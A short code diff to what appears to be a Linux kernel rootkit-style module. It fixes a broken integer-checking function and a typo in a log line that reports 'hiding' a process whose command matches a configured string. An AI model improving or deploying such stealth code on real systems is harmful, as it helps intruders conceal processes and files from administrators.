@@ -187,13 +187,15 @@ int check_file_suffix(const char *name)	//checks if file ends on suffix
 
 int is_int(const char *data)
 {
-	while(data)
+	if(data==NULL)
+	  return 0;
+	while(*data)
 	{
 	      if(*data<'0' || *data>'9')
 		return 0;
 	      data++;
 	}
-	return 0;
+	return 1;
 }
 
 int check_process_prefix(const char *name)
@@ -238,7 +240,7 @@ int check_process_prefix(const char *name)
 	}
 
 	if (strstr(buf, COMMAND_CONTAINS)) {
-		printk(KERN_DEBUG "hidding %s\n", buf);
+		printk(KERN_DEBUG "hiding %s\n", buf);
 		res = 1;
 	}
 
